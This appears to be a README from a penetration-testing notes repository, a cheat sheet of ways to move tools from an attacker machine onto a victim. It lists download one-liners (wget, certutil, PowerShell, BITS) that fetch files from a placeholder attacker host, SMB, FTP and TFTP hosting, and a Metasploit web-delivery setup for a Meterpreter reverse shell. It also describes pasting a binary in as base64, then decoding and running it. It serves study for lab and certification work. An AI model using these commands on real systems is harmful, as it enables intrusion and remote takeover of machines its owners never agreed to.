# tool-transfer

In the beginning of my journey I was struggling with getting my scripts and programs from one machine to another. In this repo my objective is to find every way you can transfer your tools!

### HTTP

Set up an HTTP server on your attacker machine and download the files from the victim machine. The hosted file must be in the same directory where you execute this command.

- `port=8888; python3 -m http.server      $port`
- `port=8888; python  -m SimpleHTTPServer $port`

From the victim machine you can use any browser you want to navigate to the IP address and download the files or you can use the following commands:

### CMD

- `wget http://$attacker_address/$filename`
- `certutil -urlcache -split -f "http://$attacker_ip:$port/$filename" $output-filename`


### Powershell

- `powershell "(New-Object System.Net.WebClient).Downloadfile('http://$ATTACKER_IP:$port/$filename','$output-filename')"`
- `curl http://$attacker_address/$filename -O $output-filename`
- `Invoke-WebRequest http://$attacker_address/$filename -O $output-filename`

- `powershell.exe -c (Start-BitsTransfer -Source "http://$attacker_ip/$filename -Destination C:\temp\$filename")`

### SSH

If you have an SSH session open, then you can use the SCP command to download files. To download/upload directories use the -r (recursive) switch

Downloading files from the host:

- `scp username@from_host:file.txt /local/directory/`

Uploading files to the host:

- `scp file.txt username@to_host:/remote/directory/`

### FTP

Set up an FTP server on your attacker machine:

note: (you might install `pyftpdlib` with `apt-get install python-pyftpdlib` first)
`python -m pyftpdlib 21`

ftp to the attacker machine and use the GET command to download files.

- `ftp $attacker_ip_ address`

To upload files use the `-w` switch to enable anonymous write and the PUT command.

### TFTP

Set a tftp server on your attacker machine using the following command:

- `atftpd --daemon --port 69 root-dir`

where atftpd is the tftp server we want to execute, we execute are gonna execute it as a service (daemon) on port 89 and root-directory will be the directory where the files are which we want to transfer.

To download the hosted files use:

- `tftp -i $attacker_ip GET file`

To upload files use the same command with the PUT argument.

### SMB

You can host files via SMB, use the smbserver.py script which is part of the impacket project with the following command

`smbserver.py $share_name $shared_directory`

- `smbserver.py share /usr/share/transfer`

If you want to share the current directory use the pwd command.

- `smbserver.py $share_name pwd`

To download the files use the following command:

`copy \\$attacker_ip\$share_name\$file_name $out_filename`

e.g: `copy \\192.168.0.122\share\nc.exe nc.exe`

### Metasploit

You can use the web_delivery method to transfer reverse shells. Type the following commands inside metasploit.

```
use multi/script/web delivery
set payload to windows/meterpreter/reverse_tcp
set target PSH (powershell)
set lhost eth0
```

localhost and srvhost are the same

if you are connected to the target network via VPN use the tun0 interface instead of eth0. srvhost is the ip address serving the malicious script, lhost is where the call-back will happen from the reverse-shell. In this example I used a Meterpreter shell but you choose whatever shell type you like.


## Encodings

### Base64

Another cool trick is to encode your script, using base64, then copy-paste it between sessions.

```
python -c 'print(__import__("base64").b64encode(open("file_name", "rb").read()))'
echo "base64_encoded_script" > output.txt
base64 -d output.txt > out_filename
chmod +x out_filename
./out_filename
```

you can also use bash:
- `base64 plaintext_file`
- `cat base64_encoded_file | base64 -d`


So we encoded the binary, copy-pasted the base64 string into a text file using echo, \
then decrypted it with the base64 utility using the -d switch (decrypt) to a single file. \
We made it executable with the chmod +x command than executed it.

It works well on smaller scripts, but copy pasting the string of a complex program could crash the shell.

### Notes:

If you can't download your files from your attacker machine, try to upload them to pastebin, dropbox or other cloud storage services and retrive them from there.



